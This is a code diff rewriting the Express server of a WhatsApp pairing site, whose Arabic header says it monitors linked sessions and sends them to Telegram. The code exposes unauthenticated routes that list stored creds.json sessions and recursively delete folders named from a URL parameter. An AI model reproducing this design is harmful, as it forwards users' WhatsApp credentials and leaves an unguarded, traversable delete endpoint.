@@ -1,32 +1,105 @@
-import express from 'express';
-import bodyParser from 'body-parser';
-import { fileURLToPath } from 'url';
-import path from 'path';
-// Importing the modules
-import pairRouter from './pair.js';
-import qrRouter from './qr.js';
-import QRCode from 'qrcode';
-const app = express();
+/**
+ * ═══════════════════════════════════════════════════════
+ * 🚀 SUKUNA PLATFORM | منصة سوكونا الرئيسية
+ * ═══════════════════════════════════════════════════════
+ * 👑 المطور: آدم (شادو) | Adam (Shadow)
+ * 🤖 البوت: سوكونا | Sukuna
+ * 📜 الوصف: موقع ربط الواتساب + مراقبة الجلسات + إرسالها للتليجرام
+ * ═══════════════════════════════════════════════════════
+ */
 
-// Resolve the current directory path in ES modules
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
+import express from 'express'
+import bodyParser from 'body-parser'
+import { fileURLToPath } from 'url'
+import path from 'path'
+import fs from 'fs'
+import config from './config.js'
 
-const PORT = process.env.PORT || 8000;
+// استيراد الراوترات
+import pairRouter from './pair.js'
+import qrRouter from './qr.js'
+import { startTelegramMonitor } from './telegram-monitor.js'
 
-import('events').then(events => {events.EventEmitter.defaultMaxListeners = 500});
+const app = express()
 
-// Middleware
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(__dirname));
+const __filename = fileURLToPath(import.meta.url)
+const __dirname = path.dirname(__filename)
+const PORT = config.PORT
 
-// Routes
-app.get('/', (req, res) => {res.sendFile(path.join(__dirname, 'pair.html'))});
+// زيادة حد الـ Event Listeners
+import('events').then(events => {
+  events.EventEmitter.defaultMaxListeners = 500
+})
 
-app.use('/pair', pairRouter);
-app.use('/qr', qrRouter);
+// ═══ إنشاء المجلدات المطلوبة ═══
+const dirs = [
+  config.sessionsDir,
+  config.subSessionsDir,
+  './pair_sessions',
+  './qr_sessions'
+]
 
-app.listen(PORT, () => {console.log(`YoutTube: @mr_unique_hacker\n\nGitHub: @mruniquehacker\n\nServer running on http://localhost:${PORT}`)});
+for (const dir of dirs) {
+  if (!fs.existsSync(dir)) {
+    fs.mkdirSync(dir, { recursive: true })
+    console.log(`📁 Created: ${dir}`)
+  }
+}
 
-export default app;
+// ═══ Middleware ═══
+app.use(bodyParser.json())
+app.use(bodyParser.urlencoded({ extended: true }))
+app.use(express.static(__dirname))
+
+// ═══ Routes ═══
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'pair.html'))
+})
+
+app.use('/pair', pairRouter)
+app.use('/qr', qrRouter)
+
+// ═══ API: عرض الجلسات ═══
+app.get('/api/sessions', (req, res) => {
+  try {
+    const subDir = config.subSessionsDir
+    const sessions = fs.readdirSync(subDir).filter(s => {
+      return fs.existsSync(path.join(subDir, s, 'creds.json'))
+    })
+    res.json({ sessions, count: sessions.length })
+  } catch (e) {
+    res.json({ sessions: [], count: 0 })
+  }
+})
+
+// ═══ API: حذف جلسة ═══
+app.delete('/api/session/:number', (req, res) => {
+  try {
+    const num = req.params.number
+    const sessionPath = path.join(config.subSessionsDir, num)
+    if (fs.existsSync(sessionPath)) {
+      fs.rmSync(sessionPath, { recursive: true, force: true })
+      res.json({ success: true, message: `Session ${num} deleted` })
+    } else {
+      res.json({ success: false, message: 'Session not found' })
+    }
+  } catch (e) {
+    res.json({ success: false, message: e.message })
+  }
+})
+
+// ═══ تشغيل السيرفر ═══
+app.listen(PORT, async () => {
+  console.log('╔════════════════════════════════════════╗')
+  console.log('║   🕸 SUKUNA PLATFORM IS RUNNING! 🕸   ║')
+  console.log('╠════════════════════════════════════════╣')
+  console.log(`║   🌐 Server: http://localhost:${PORT}    ║`)
+  console.log('║   👑 Developer: Adam (Shadow)          ║')
+  console.log('╚════════════════════════════════════════╝')
+  console.log('')
+
+  // تشغيل بوت مراقبة الجلسات
+  await startTelegramMonitor()
+})
+
+export default app
